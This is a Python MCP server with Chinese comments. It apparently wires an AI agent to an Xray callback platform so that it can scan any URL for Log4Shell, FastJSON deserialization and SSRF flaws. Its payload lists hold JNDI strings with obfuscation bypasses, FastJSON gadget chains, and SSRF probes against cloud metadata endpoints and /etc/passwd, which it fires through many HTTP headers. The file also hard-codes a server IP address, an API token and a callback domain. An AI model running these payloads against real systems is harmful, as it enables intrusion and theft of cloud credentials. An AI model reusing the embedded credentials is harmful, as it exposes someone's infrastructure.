#!/usr/bin/env python3
"""
Xray 反连平台 + MCP 漏洞测试服务
支持 Log4j / FastJSON / SSRF 的 DNS/HTTP/RMI 回调检测

⚠️  免责声明：本工具仅供授权渗透测试或安全研究使用。
    请勿对未经授权的目标使用。
"""

import asyncio
import json
import logging
import time
import uuid
from typing import Any

import httpx
from mcp.server import Server
from mcp.server.stdio import stdio_server
from mcp.types import TextContent, Tool

# ─────────────────────────────────────────────
# 日志配置
# ─────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("xray-mcp")

# ─────────────────────────────────────────────
# Xray 反连平台配置（按需修改）
# ─────────────────────────────────────────────
XRAY_API_BASE   = "http://59.110.235.230:8001"   # Xray 反连平台 API 地址
XRAY_TOKEN      = "skrrr0320@!"    # Xray API Token（留空则不鉴权）
XRAY_DOMAIN     = "dariatest.art"        # 反连平台域名（DNS 回调用）
POLL_INTERVAL   = 2                          # 轮询间隔（秒）
POLL_TIMEOUT    = 30                         # 最大等待时间（秒）

# ─────────────────────────────────────────────
# Payload 模板库
# ─────────────────────────────────────────────

LOG4J_PAYLOADS = [
    "${{jndi:ldap://{domain}/{token}}}",
    "${{jndi:dns://{domain}/{token}}}",
    "${{jndi:rmi://{domain}/{token}}}",
    # 绕过变体
    "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{domain}/{token}}}",
    "${{j${{::-n}}di:ldap://{domain}/{token}}}",
    "${{jndi:${{lower:l}}${{lower:d}}a${{lower:p}}://{domain}/{token}}}",
    "${{${{env:NaN:-j}}ndi:ldap://{domain}/{token}}}",
    "${{jndi:ldap://{domain}/{token}}}%0a",   # 换行绕过
    "%24%7Bjndi%3Aldap%3A%2F%2F{domain}%2F{token}%7D",  # URL 编码
]

FASTJSON_PAYLOADS = [
    # JNDI LDAP 通用探测
    '{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/{token}","autoCommit":true}}',
    # TemplatesImpl 链（1.2.24）
    '{{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",'
    '"_bytecodes":[""],"_name":"x","_tfactory":{{}},"_outputProperties":{{}},'
    '"_version":1,"allowedProtocols":"all"}}',
    # BasicDataSource 链（1.2.47）
    '{{"a":{{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"}},'
    '"b":{{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://{domain}/{token}","autoCommit":true}}}}',
    # 1.2.68 绕过
    '{{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl",'
    '"dataSourceName":"ldap://{domain}/{token}","autoCommit":true}}',
]

SSRF_PAYLOADS = [
    "http://{domain}/{token}",
    "https://{domain}/{token}",
    "http://{domain}:{port}/{token}",
    "//{domain}/{token}",
    "dict://{domain}/{token}",
    "file:///etc/passwd",
    "http://169.254.169.254/latest/meta-data/",   # AWS IMDSv1
    "http://100.100.100.200/latest/meta-data/",    # 阿里云
    "http://metadata.google.internal/",            # GCP
    "http://192.168.1.1/",
    "http://10.0.0.1/",
    "http://127.0.0.1:8080/",
]

# 常见注入 Header（Log4j / SSRF）
INJECT_HEADERS = [
    "User-Agent",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Originating-IP",
    "Referer",
    "X-Api-Version",
    "X-Custom-IP-Authorization",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Authorization",
    "Cookie",
    "X-Wap-Profile",
    "Contact",
    "X-Att-Deviceid",
    "X-WAP-Profile",
    "X-Request-ID",
]

# ─────────────────────────────────────────────
# Xray 反连平台 API 封装
# ─────────────────────────────────────────────

class XrayClient:
    def __init__(self, base_url: str, token: str = ""):
        self.base = base_url.rstrip("/")
        self.headers = {"Content-Type": "application/json"}
        if token:
            self.headers["Authorization"] = f"Bearer {token}"

    async def generate_token(self, label: str = "") -> dict:
        """生成一个唯一 token，用于区分不同测试任务的回调"""
        token = f"{label}-{uuid.uuid4().hex[:8]}" if label else uuid.uuid4().hex
        return {"token": token, "domain": f"{token}.{XRAY_DOMAIN}"}

    async def poll_callbacks(self, token: str, timeout: int = POLL_TIMEOUT) -> list[dict]:
        """
        轮询 Xray 反连平台，等待指定 token 的回调记录。
        返回回调列表（可能包含 dns / http / rmi 类型）。
        """
        deadline = time.time() + timeout
        found: list[dict] = []

        async with httpx.AsyncClient(timeout=10) as client:
            while time.time() < deadline:
                try:
                    resp = await client.get(
                        f"{self.base}/api/v1/records",
                        params={"token": token},
                        headers=self.headers,
                    )
                    if resp.status_code == 200:
                        data = resp.json()
                        records = data.get("data", data) if isinstance(data, dict) else data
                        for rec in records:
                            # 统一字段名
                            cb_type = rec.get("type", rec.get("protocol", "unknown"))
                            found.append({
                                "type":        cb_type,
                                "remote_addr": rec.get("remote_addr", rec.get("source", "")),
                                "raw":         rec.get("raw", rec.get("request", "")),
                                "timestamp":   rec.get("created_at", rec.get("time", "")),
                            })
                        if found:
                            return found
                except Exception as e:
                    logger.warning(f"轮询失败: {e}")

                await asyncio.sleep(POLL_INTERVAL)

        return found   # 超时返回空列表

    async def list_all_callbacks(self, since_seconds: int = 300) -> list[dict]:
        """查询最近 N 秒内的所有回调（用于总览）"""
        since = int(time.time()) - since_seconds
        async with httpx.AsyncClient(timeout=10) as client:
            try:
                resp = await client.get(
                    f"{self.base}/api/v1/records",
                    params={"since": since},
                    headers=self.headers,
                )
                if resp.status_code == 200:
                    data = resp.json()
                    return data.get("data", data) if isinstance(data, dict) else data
            except Exception as e:
                logger.warning(f"查询全量回调失败: {e}")
        return []


xray = XrayClient(XRAY_API_BASE, XRAY_TOKEN)

# ─────────────────────────────────────────────
# 通用 HTTP 请求发送器
# ─────────────────────────────────────────────

async def send_request(
    method: str,
    url: str,
    headers: dict | None = None,
    body: str | None = None,
    timeout: int = 10,
) -> dict:
    """发送 HTTP 请求，返回状态码、响应头、响应体"""
    async with httpx.AsyncClient(
        timeout=timeout,
        follow_redirects=False,
        verify=False,
    ) as client:
        try:
            req_headers = headers or {}
            resp = await client.request(
                method.upper(),
                url,
                headers=req_headers,
                content=body.encode() if body else None,
            )
            return {
                "status_code": resp.status_code,
                "headers":     dict(resp.headers),
                "body":        resp.text[:2000],
                "error":       None,
            }
        except Exception as e:
            return {
                "status_code": 0,
                "headers":     {},
                "body":        "",
                "error":       str(e),
            }

# ─────────────────────────────────────────────
# 漏洞测试核心逻辑
# ─────────────────────────────────────────────

async def test_log4j(target_url: str, extra_headers: dict | None = None) -> dict:
    """
    Log4j（CVE-2021-44228 / Log4Shell）测试
    - 将 JNDI Payload 注入所有常见 Header
    - 等待 DNS/HTTP/RMI 回调
    """
    info = await xray.generate_token("log4j")
    token  = info["token"]
    domain = info["domain"]

    logger.info(f"[Log4j] token={token}  目标={target_url}")

    results: list[dict] = []

    async with httpx.AsyncClient(timeout=15, follow_redirects=False, verify=False) as client:
        for payload_tpl in LOG4J_PAYLOADS[:4]:   # 取前 4 个，覆盖 ldap/dns/rmi + 1 绕过
            payload = payload_tpl.format(domain=domain, token=token)

            # 每个 payload 注入所有 header
            for header in INJECT_HEADERS:
                inject_headers = dict(extra_headers or {})
                inject_headers[header] = payload

                try:
                    resp = await client.request(
                        "GET", target_url, headers=inject_headers
                    )
                    results.append({
                        "payload":     payload,
                        "header":      header,
                        "status_code": resp.status_code,
                    })
                except Exception as e:
                    results.append({
                        "payload": payload,
                        "header":  header,
                        "error":   str(e),
                    })

    # 等待回调
    callbacks = await xray.poll_callbacks(token)
    cb_types  = list({c["type"] for c in callbacks})

    return {
        "vuln":           "Log4j (CVE-2021-44228)",
        "target":         target_url,
        "token":          token,
        "payloads_sent":  len(results),
        "callbacks":      callbacks,
        "callback_types": cb_types,
        "vulnerable":     len(callbacks) > 0,
        "severity":       "CRITICAL" if callbacks else "UNKNOWN",
        "detail":         (
            f"收到 {len(callbacks)} 个回调，类型：{cb_types}" if callbacks
            else "未检测到回调，目标可能不受影响或无法出网"
        ),
    }


async def test_fastjson(target_url: str, custom_headers: dict | None = None) -> dict:
    """
    FastJSON 反序列化测试（多版本）
    - 自动识别 JSON 接口
    - 注入 @type JNDI Payload
    - 等待回调
    """
    info = await xray.generate_token("fastjson")
    token  = info["token"]
    domain = info["domain"]

    logger.info(f"[FastJSON] token={token}  目标={target_url}")

    headers = {
        "Content-Type": "application/json",
        "Accept":        "application/json",
        **(custom_headers or {}),
    }

    results: list[dict] = []

    for tpl in FASTJSON_PAYLOADS:
        payload = tpl.format(domain=domain, token=token, port=80)
        resp = await send_request("POST", target_url, headers=headers, body=payload)
        results.append({
            "payload":     payload[:120] + "...",
            "status_code": resp["status_code"],
            "error":       resp["error"],
        })

    # 额外：GET 方式探测 JSON 参数
    probe_resp = await send_request("GET", target_url)
    if '"@type"' in probe_resp.get("body", ""):
        results.append({"note": "响应体中发现 @type 字段，FastJSON 特征明显"})

    callbacks = await xray.poll_callbacks(token)
    cb_types  = list({c["type"] for c in callbacks})

    return {
        "vuln":           "FastJSON 反序列化",
        "target":         target_url,
        "token":          token,
        "payloads_sent":  len(results),
        "callbacks":      callbacks,
        "callback_types": cb_types,
        "vulnerable":     len(callbacks) > 0,
        "severity":       "CRITICAL" if callbacks else "UNKNOWN",
        "detail":         (
            f"收到 {len(callbacks)} 个回调（{cb_types}），存在反序列化漏洞"
            if callbacks
            else "未检测到回调，可能不受影响或存在出网限制"
        ),
    }


async def test_ssrf(
    target_url: str,
    param_name: str = "url",
    method: str = "GET",
    custom_headers: dict | None = None,
) -> dict:
    """
    SSRF 测试
    - 替换指定参数为反连地址
    - 同时测试内网常见地址
    - 等待 HTTP/DNS 回调
    """
    info = await xray.generate_token("ssrf")
    token  = info["token"]
    domain = info["domain"]

    logger.info(f"[SSRF] token={token}  目标={target_url}  参数={param_name}")

    results: list[dict] = []
    headers = custom_headers or {}

    for payload_tpl in SSRF_PAYLOADS:
        payload = payload_tpl.format(domain=domain, token=token, port=80)

        if method.upper() == "GET":
            from urllib.parse import urlencode, urlparse, parse_qs, urljoin
            sep = "&" if "?" in target_url else "?"
            test_url = f"{target_url}{sep}{param_name}={payload}"
            resp = await send_request("GET", test_url, headers=headers)
        else:
            body = json.dumps({param_name: payload})
            resp = await send_request(
                "POST", target_url,
                headers={"Content-Type": "application/json", **headers},
                body=body,
            )

        results.append({
            "payload":     payload,
            "status_code": resp["status_code"],
            "error":       resp["error"],
        })

    # 额外：在 Header 中注入 SSRF
    for header in ["X-Forwarded-For", "Referer", "X-Real-IP"]:
        ssrf_val = f"http://{domain}/{token}-header"
        resp = await send_request(
            "GET", target_url,
            headers={header: ssrf_val, **headers},
        )
        results.append({
            "vector":      f"Header:{header}",
            "payload":     ssrf_val,
            "status_code": resp["status_code"],
        })

    callbacks = await xray.poll_callbacks(token)
    cb_types  = list({c["type"] for c in callbacks})

    return {
        "vuln":           "SSRF",
        "target":         target_url,
        "param":          param_name,
        "token":          token,
        "payloads_sent":  len(results),
        "callbacks":      callbacks,
        "callback_types": cb_types,
        "vulnerable":     len(callbacks) > 0,
        "severity":       "HIGH" if callbacks else "UNKNOWN",
        "detail":         (
            f"收到 {len(callbacks)} 个回调（{cb_types}），确认 SSRF 出网"
            if callbacks
            else "未检测到回调，可能不受影响或内网隔离"
        ),
    }


async def run_full_scan(
    target_url: str,
    ssrf_param: str = "url",
    method: str = "GET",
    custom_headers: dict | None = None,
) -> dict:
    """全量扫描：Log4j + FastJSON + SSRF 并发执行"""
    logger.info(f"[全量扫描] 目标={target_url}")

    log4j_task    = asyncio.create_task(test_log4j(target_url, custom_headers))
    fastjson_task = asyncio.create_task(test_fastjson(target_url, custom_headers))
    ssrf_task     = asyncio.create_task(test_ssrf(target_url, ssrf_param, method, custom_headers))

    log4j_res, fastjson_res, ssrf_res = await asyncio.gather(
        log4j_task, fastjson_task, ssrf_task
    )

    vulns_found = [
        r for r in [log4j_res, fastjson_res, ssrf_res]
        if r.get("vulnerable")
    ]

    return {
        "target":       target_url,
        "scan_time":    time.strftime("%Y-%m-%dT%H:%M:%S"),
        "total_vulns":  len(vulns_found),
        "log4j":        log4j_res,
        "fastjson":     fastjson_res,
        "ssrf":         ssrf_res,
        "summary":      [v["vuln"] for v in vulns_found] if vulns_found else ["未发现漏洞"],
    }


async def check_callbacks(since_seconds: int = 300) -> dict:
    """查询最近 N 秒的所有回调记录"""
    records = await xray.list_all_callbacks(since_seconds)
    return {
        "since_seconds": since_seconds,
        "total":         len(records),
        "records":       records,
    }


# ─────────────────────────────────────────────
# MCP 服务注册
# ─────────────────────────────────────────────

app = Server("xray-vuln-tester")


@app.list_tools()
async def list_tools() -> list[Tool]:
    return [
        Tool(
            name="test_log4j",
            description=(
                "测试目标是否存在 Log4j（CVE-2021-44228 / Log4Shell）漏洞。"
                "通过将 JNDI Payload 注入常见 HTTP Header，配合 xray 反连平台"
                "检测 DNS/HTTP/RMI 回调。仅限授权测试。"
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "target_url":     {"type": "string", "description": "目标 URL，如 http://example.com/api/login"},
                    "extra_headers":  {"type": "object", "description": "额外请求头（可选），如 {\"Authorization\": \"Bearer xxx\"}"},
                },
                "required": ["target_url"],
            },
        ),
        Tool(
            name="test_fastjson",
            description=(
                "测试目标 JSON 接口是否存在 FastJSON 反序列化漏洞（多版本覆盖）。"
                "通过 @type 字段注入 JNDI Payload，配合 xray 反连平台检测回调。仅限授权测试。"
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "target_url":      {"type": "string",  "description": "接受 JSON 的目标接口 URL"},
                    "custom_headers":  {"type": "object",  "description": "自定义请求头（可选）"},
                },
                "required": ["target_url"],
            },
        ),
        Tool(
            name="test_ssrf",
            description=(
                "测试目标是否存在 SSRF 漏洞。向指定参数或 Header 注入反连地址，"
                "并同时测试常见内网/元数据地址，配合 xray 检测出网回调。仅限授权测试。"
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "target_url":     {"type": "string",  "description": "目标 URL"},
                    "param_name":     {"type": "string",  "description": "SSRF 参数名，默认 url"},
                    "method":         {"type": "string",  "description": "请求方式 GET 或 POST，默认 GET"},
                    "custom_headers": {"type": "object",  "description": "自定义请求头（可选）"},
                },
                "required": ["target_url"],
            },
        ),
        Tool(
            name="full_scan",
            description=(
                "对目标同时执行 Log4j + FastJSON + SSRF 全量检测，"
                "并发运行后汇总结果。仅限授权测试。"
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "target_url":     {"type": "string",  "description": "目标 URL"},
                    "ssrf_param":     {"type": "string",  "description": "SSRF 参数名，默认 url"},
                    "method":         {"type": "string",  "description": "GET 或 POST，默认 GET"},
                    "custom_headers": {"type": "object",  "description": "自定义请求头（可选）"},
                },
                "required": ["target_url"],
            },
        ),
        Tool(
            name="check_callbacks",
            description=(
                "查询 xray 反连平台最近收到的所有回调记录（DNS/HTTP/RMI），"
                "用于确认是否有回调未被关联到具体任务。"
            ),
            inputSchema={
                "type": "object",
                "properties": {
                    "since_seconds": {"type": "integer", "description": "查询最近 N 秒的记录，默认 300"},
                },
            },
        ),
    ]


@app.call_tool()
async def call_tool(name: str, arguments: dict[str, Any]) -> list[TextContent]:
    try:
        if name == "test_log4j":
            result = await test_log4j(
                arguments["target_url"],
                arguments.get("extra_headers"),
            )
        elif name == "test_fastjson":
            result = await test_fastjson(
                arguments["target_url"],
                arguments.get("custom_headers"),
            )
        elif name == "test_ssrf":
            result = await test_ssrf(
                arguments["target_url"],
                arguments.get("param_name", "url"),
                arguments.get("method", "GET"),
                arguments.get("custom_headers"),
            )
        elif name == "full_scan":
            result = await run_full_scan(
                arguments["target_url"],
                arguments.get("ssrf_param", "url"),
                arguments.get("method", "GET"),
                arguments.get("custom_headers"),
            )
        elif name == "check_callbacks":
            result = await check_callbacks(arguments.get("since_seconds", 300))
        else:
            result = {"error": f"未知工具: {name}"}

    except Exception as e:
        logger.exception(f"工具执行失败: {name}")
        result = {"error": str(e)}

    return [TextContent(type="text", text=json.dumps(result, ensure_ascii=False, indent=2))]


# ─────────────────────────────────────────────
# 入口
# ─────────────────────────────────────────────

async def main():
    logger.info("Xray MCP 漏洞测试服务启动（stdio 模式）")
    async with stdio_server() as (read_stream, write_stream):
        await app.run(read_stream, write_stream, app.create_initialization_options())


if __name__ == "__main__":
    asyncio.run(main())
